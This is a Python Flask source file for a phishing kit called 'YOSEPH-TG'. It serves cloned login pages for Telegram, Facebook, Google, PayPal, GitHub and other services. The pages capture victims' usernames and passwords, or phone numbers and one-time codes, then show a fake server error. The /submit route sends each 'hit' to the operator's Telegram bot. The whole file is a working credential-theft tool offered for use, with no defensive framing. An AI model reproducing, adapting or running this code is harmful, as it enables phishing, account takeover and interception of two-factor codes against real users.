import os, requests, sys, base64, time, datetime
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- Configuration & High-Level Security ---
CONFIG_FILE = "config.txt"
TOOL_NAME = "YOSEPH-TG"
# '@Yosephalganeh44' -> Base64
ENCODED_PASS = "QFlvc2VwaGFsZ2FuZWg0NA==" 
SELECTED_PLATFORM = {}

# --- Advanced Platform Database ---
TEMPLATES = {
    "1": {
        "name": "Telegram", 
        "color": "#3390ec", 
        "logo": "https://telegram.org/img/t_logo.png", 
        "type": "phone",
        "desc": "Enter your phone number to receive a verification code."
    },
    "2": {
        "name": "Facebook", 
        "color": "#1877f2", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg", 
        "type": "login",
        "desc": "Connect with friends and the world around you."
    },
    "3": {
        "name": "Instagram", 
        "color": "linear-gradient(45deg, #f09433, #dc2743, #bc1888)", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg", 
        "type": "login",
        "desc": "Log in to see photos and videos from your friends."
    },
    "4": {
        "name": "Google", 
        "color": "#4285F4", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg", 
        "type": "login",
        "desc": "Use your Google Account to continue to Gmail."
    },
    "5": {
        "name": "TikTok", 
        "color": "#000000", 
        "logo": "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg", 
        "type": "login",
        "desc": "Make Your Day. Log in to TikTok."
    },
    "6": {
        "name": "WhatsApp", 
        "color": "#25d366", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg", 
        "type": "phone",
        "desc": "Verify your WhatsApp account using your phone number."
    },
    "7": {
        "name": "Snapchat", 
        "color": "#fffc00", 
        "logo": "https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg", 
        "type": "login", 
        "text": "black",
        "desc": "Snapchat is a fast and fun way to share the moment."
    },
    "8": {
        "name": "Netflix", 
        "color": "#e50914", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg", 
        "type": "login",
        "desc": "See what's next. Watch anywhere. Cancel anytime."
    },
    "9": {
        "name": "Spotify", 
        "color": "#1DB954", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg", 
        "type": "login",
        "desc": "Listening is everything. Log in to Spotify."
    },
    "10": {
        "name": "GitHub", 
        "color": "#24292e", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/9/91/Octicons-mark-github.svg", 
        "type": "login",
        "desc": "Where the world builds software. Sign in."
    },
    "11": {
        "name": "PayPal", 
        "color": "#003087", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg", 
        "type": "login",
        "desc": "The safer, easier way to pay online."
    },
    "12": {
        "name": "LinkedIn", 
        "color": "#0077b5", 
        "logo": "https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png", 
        "type": "login",
        "desc": "Welcome to your professional community."
    }
}

# --- CLI Functions (Zphisher Style) ---
def clear(): os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""\033[96m
 ╔═══════════════════════════════════════════════════════════╗
 ║  \033[93m█▄─█─▄█─▄▄─█─▄▄▄─█▄─▄▄─█─█─█─▀█▄─▄▄─█\033[96m              ║
 ║  \033[93m─█─▀─██─█─║█─█─▄█─█─█─║█─█─█──█─█─║█\033[96m              ║
 ║  \033[93m─▀───▀▀▄▄▀▀▀▄▄▄▀▀▄▄▀▀▀▀▀▀▀▀▀──▀▄▄▀▀▀\033[96m              ║
 ╠═══════════════════════════════════════════════════════════╣
 ║  \033[97mDeveloper : \033[92mYoseph Alganeh (@JO_INVISBLE)\033[96m                 ║
 ║  \033[97mVersion   : \033[92m6.0 (Ultimate Edition)\033[96m                    ║
 ╚═══════════════════════════════════════════════════════════╝\033[0m""")

def check_access():
    clear(); banner()
    p = input("\033[93m[?] Enter Master Password: \033[0m").strip()
    if p != base64.b64decode(ENCODED_PASS).decode():
        print("\033[91m[!] ACCESS DENIED! SHUTTING DOWN...\033[0m"); sys.exit()
    print("\033[92m[+] Verification Successful! Access Granted.\033[0m")
    time.sleep(1)

def setup_bot():
    if not os.path.exists(CONFIG_FILE):
        print("\n\033[95m[!] Bot Configuration Required\033[0m")
        t = input("\033[93m[?] Bot Token: \033[0m").strip()
        i = input("\033[93m[?] Chat ID: \033[0m").strip()
        with open(CONFIG_FILE, "w") as f: f.write(f"{t}\n{i}")
        return t, i
    with open(CONFIG_FILE, "r") as f:
        d = f.read().splitlines()
        return d[0], d[1]

def show_menu():
    global SELECTED_PLATFORM
    clear(); banner()
    print("\033[95m  [ TARGET SELECTION MENU ]\033[0m")
    print("\033[90m  --------------------------------------\033[0m")
    for k, v in TEMPLATES.items():
        print(f"  [\033[92m{k}\033[0m] \033[97m{v['name']:<15}\033[0m", end="")
        if int(k) % 2 == 0: print()
    print("\n\033[91m  [0] Exit Tool\033[0m")
    
    c = input("\n\033[93m[YOSEPH-TG] > \033[0m").strip()
    if c == '0': sys.exit()
    if c in TEMPLATES:
        SELECTED_PLATFORM = TEMPLATES[c]
        print(f"\n\033[92m[*] Generating {SELECTED_PLATFORM['name']} Link...\033[0m")
        time.sleep(2)
    else: show_menu()

# --- Advanced HTML/CSS with Animations ---
HTML_ULTIMATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ name }} | Authentication</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .animate-up { animation: fadeIn 0.8s ease-out; }
        .btn-hover { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        .btn-hover:active { transform: scale(0.95); }
        input:focus { box-shadow: 0 0 0 3px {{ color }}44; }
    </style>
</head>
<body class="bg-slate-50 flex justify-center items-center min-h-screen p-6">
    <div class="bg-white p-10 rounded-[2.5rem] shadow-[0_20px_50px_rgba(0,0,0,0.1)] w-full max-w-md animate-up border border-gray-50 text-center">
        <div class="mb-8">
            <img src="{{ logo }}" class="w-20 h-20 mx-auto object-contain drop-shadow-md">
        </div>
        
        <h1 id="main-title" class="text-3xl font-black text-gray-800 mb-2">Welcome Back</h1>
        <p id="main-desc" class="text-gray-400 text-sm px-4 mb-10">{{ desc }}</p>

        <div id="input-container" class="space-y-5">
            {% if type == 'phone' %}
                <div class="relative">
                    <input type="tel" id="field1" placeholder="Phone Number (+251...)" 
                    class="w-full p-5 bg-gray-50 border-2 border-transparent rounded-2xl outline-none focus:border-{{ color }} focus:bg-white transition-all text-lg">
                </div>
                <button onclick="handleNext()" style="background: {{ color }}; color: {{ text_color|default('white') }}" 
                class="w-full p-5 font-black rounded-2xl shadow-xl btn-hover uppercase tracking-widest">Next Step</button>
            {% else %}
                <input type="text" id="field1" placeholder="Email, Username or Phone" 
                class="w-full p-5 bg-gray-50 border-2 border-transparent rounded-2xl outline-none focus:border-{{ color }} focus:bg-white transition-all text-lg">
                
                <input type="password" id="field2" placeholder="Password" 
                class="w-full p-5 bg-gray-50 border-2 border-transparent rounded-2xl outline-none focus:border-{{ color }} focus:bg-white transition-all text-lg">
                
                <button onclick="handleLogin()" style="background: {{ color }}; color: {{ text_color|default('white') }}" 
                class="w-full p-5 font-black rounded-2xl shadow-xl btn-hover uppercase tracking-widest">Sign In</button>
            {% endif %}
        </div>

        <div id="loader" class="hidden mt-8 text-center">
            <div class="inline-block w-8 h-8 border-4 border-slate-200 border-t-{{ color }} rounded-full animate-spin"></div>
            <p class="text-xs text-gray-400 mt-2 font-bold tracking-tighter">SECURELY CONNECTING...</p>
        </div>
        
        <p id="error-msg" class="mt-8 text-sm font-bold text-red-500 min-h-[1rem]"></p>
        
        <div class="mt-12 pt-6 border-t border-gray-100 flex justify-between text-[10px] text-gray-300 font-bold uppercase tracking-widest">
            <span>Security V2.4</span>
            <span>&copy; {{ name }} 2026</span>
        </div>
    </div>

    <script>
        let currentStep = 1;
        let val1_temp = "";

        async function handleNext() {
            val1_temp = document.getElementById('field1').value;
            if(val1_temp.length < 9) { showError("Enter a valid phone number"); return; }
            
            toggleLoader(true);
            // Preliminary send to Bot
            await sendToBackend(val1_temp, "WAITING_FOR_OTP");

            setTimeout(() => {
                toggleLoader(false);
                document.getElementById('main-title').innerText = "Verify OTP";
                document.getElementById('main-desc').innerText = "We've sent a 5-digit code to your {{ name }} app.";
                document.getElementById('input-container').innerHTML = `
                    <input type="number" id="field2" placeholder="00000" 
                    class="w-full p-5 bg-gray-50 border-2 border-transparent rounded-2xl outline-none focus:border-{{ color }} text-center text-3xl font-black tracking-[1rem]">
                    <button onclick="handleLogin()" style="background: {{ color }}; color: {{ text_color|default('white') }}" 
                    class="w-full p-5 font-black rounded-2xl shadow-xl btn-hover uppercase tracking-widest">Verify & Login</button>
                `;
            }, 1500);
        }

        async function handleLogin() {
            let v1 = val1_temp || document.getElementById('field1').value;
            let v2 = document.getElementById('field2').value;
            
            if(v1.length < 4 || v2.length < 4) { showError("Invalid credentials"); return; }
            
            toggleLoader(true);
            await sendToBackend(v1, v2);
            
            setTimeout(() => {
                toggleLoader(false);
                showError("Internal Server Error (500). Connection timed out.");
            }, 3000);
        }

        async function sendToBackend(u, p) {
            try {
                await fetch('/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: u, p: p})
                });
            } catch(e) {}
        }

        function toggleLoader(show) {
            document.getElementById('loader').classList.toggle('hidden', !show);
            document.getElementById('input-container').classList.toggle('hidden', show);
            document.getElementById('error-msg').innerText = "";
        }

        function showError(m) {
            document.getElementById('error-msg').innerText = m;
        }
    </script>
</body>
</html>
"""

# --- Flask Server Logic ---
@app.route('/')
def home():
    return render_template_string(HTML_ULTIMATE, 
        name=SELECTED_PLATFORM['name'], 
        color=SELECTED_PLATFORM['color'], 
        logo=SELECTED_PLATFORM['logo'], 
        type=SELECTED_PLATFORM['type'],
        desc=SELECTED_PLATFORM['desc'],
        text_color=SELECTED_PLATFORM.get('text', 'white')
    )

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    now = datetime.datetime.now().strftime("%H:%M:%S | %Y-%m-%d")
    
    msg = f"🚀 *{TOOL_NAME} - NEW HIT!*\n" \
          f"━━━━━━━━━━━━━━━━━━━━\n" \
          f"🌐 *Platform:* `{SELECTED_PLATFORM['name']}`\n" \
          f"👤 *Login:* `{data['u']}`\n" \
          f"🔑 *Pass/OTP:* `{data['p']}`\n" \
          f"━━━━━━━━━━━━━━━━━━━━\n" \
          f"🕒 *Time:* `{now}`\n" \
          f"✅ *Status:* `CAPTURED`"
    
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except: pass
    return jsonify({"s": "ok"})

if __name__ == '__main__':
    check_access()
    BOT_TOKEN, CHAT_ID = setup_bot()
    show_menu()
    print(f"\n\033[94m[*] Server Running: http://0.0.0.0:5000\033[0m")
    app.run(host='0.0.0.0', port=5000, debug=False)
